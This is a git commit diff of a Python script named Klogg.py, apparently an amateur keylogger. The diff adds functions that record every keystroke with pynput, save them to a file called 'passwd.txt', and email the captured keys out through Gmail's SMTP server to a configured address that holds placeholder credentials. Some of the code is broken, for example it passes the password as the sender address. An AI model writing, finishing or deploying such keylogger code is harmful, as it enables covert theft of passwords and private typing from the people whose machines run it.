f38572e0c166e0237e61afd6bb5dbaca5a578957
Damian Jeździkowski <dejmienblue@gmail.com>
2021-10-16 21:01:48 +0200

    sender method add try

--- Klogg/Klogg.py
+++ Klogg/Klogg.py
@@ -1,24 +1,33 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import smtplib
-import Orders
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
-EMAIL_PASSWORD = "thisisafakepassword"
+EMAIL_ADDRESS = "exampleOfMail@gmail.com"
+EMAIL_PASSWORD = "exampleOfPasswd"
 keys = []
 
 
-def onPress(key):
-    keys.append(key)
-    if key == Key.enter:
-        writeFile()
-    print(key)
-
-def writeFile():
+def writeFile(key):
     with open("passwd.txt", "a") as save:
-            save.write(str(keys))
+            save.write(str(key))
 
+def sendMail(email, password, message):
+    server = smtplib.SMTP(host="smtp.gmail.com", port = 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+def onPress(key):
+    global keys
+    keys.append(key)
+    print(key)
+    if key == Key.enter:
+        writeFile(keys)
+        sendMail(EMAIL_PASSWORD, EMAIL_PASSWORD, keys)
+        keys = []
+        
 def onRelease(key):
     if key == Key.esc:
         return False
